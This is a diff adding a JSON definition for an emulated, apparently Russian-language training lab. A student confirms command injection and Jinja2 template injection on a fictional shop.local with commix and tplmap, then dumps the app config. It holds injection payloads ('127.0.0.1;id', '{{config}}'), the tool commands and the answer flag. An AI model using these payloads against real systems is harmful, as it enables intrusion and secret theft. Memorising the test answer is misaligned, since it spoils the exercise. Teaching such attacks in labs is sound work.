@@ -1,0 +1,35 @@
+{
+  "id": "web-tool-injection-tools",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": { "file": "/home/student/task/found.txt", "contains": "nto{c0mm1x_tplm4p_rce}" },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    { "path": "/home/student/task/task.md", "text": "# Практика: commix/tplmap — автоматизация инъекций\n\n`shop.local` имеет эндпоинт ping (command injection) и рендер шаблона\n(SSTI Jinja2). Подтверди обе инъекции инструментами и вытащи секрет из\nконфига шаблона.\n\n1. Command injection:\n\n   commix --url='https://shop.local/ping?host=127.0.0.1' --batch\n\n2. SSTI (Jinja2):\n\n   tplmap -u 'https://shop.local/render?name=World'\n\n3. Проверяем математикой и читаем конфиг:\n\n   curl -s 'https://shop.local/render?name={{7*7}}'\n   curl -s 'https://shop.local/render?name={{config}}' > found.txt\n\n4. Набери `check`.\n" }
+  ],
+  "tools": {
+    "commix": {
+      "help": "commix --url=<url> [--batch] — детектор command injection (эмуляция)",
+      "cases": [
+        { "match": "commix|ping", "example": "--url='https://shop.local/ping?host=127.0.0.1' --batch", "output": "[+] Testing parameter 'host' for command injection\n[+] 'host' appears to be injectable via classic (results-based)\n[+] payload: 127.0.0.1;id -> uid=33(www-data)\n" }
+      ],
+      "fallback": "commix: в этой лабе эмулируется детект command injection.\n"
+    },
+    "tplmap": {
+      "help": "tplmap -u <url> — детектор SSTI (эмуляция)",
+      "cases": [
+        { "match": "tplmap|render", "example": "-u 'https://shop.local/render?name=World'", "output": "[+] Testing parameter 'name'\n[+] Jinja2 plugin has confirmed injection with value '{{7*7}}'\n[+] OS shell access available via jinja2\n" }
+      ],
+      "fallback": "tplmap: в этой лабе эмулируется детект SSTI (Jinja2).\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        { "match": "config|\\{\\{ *config", "example": "-s 'https://shop.local/render?name={{config}}'", "output": "{'SECRET_KEY': 'nto{c0mm1x_tplm4p_rce}', 'DEBUG': False}\n" },
+        { "match": "7\\*7|\\{\\{", "example": "-s 'https://shop.local/render?name={{7*7}}'", "output": "49\n" },
+        { "match": "shop\\.local", "example": "-s https://shop.local/", "output": "<!doctype html><title>shop</title>\n" }
+      ],
+      "fallback": "curl: в этой лабе эмулируется shop.local.\n"
+    }
+  }
+}
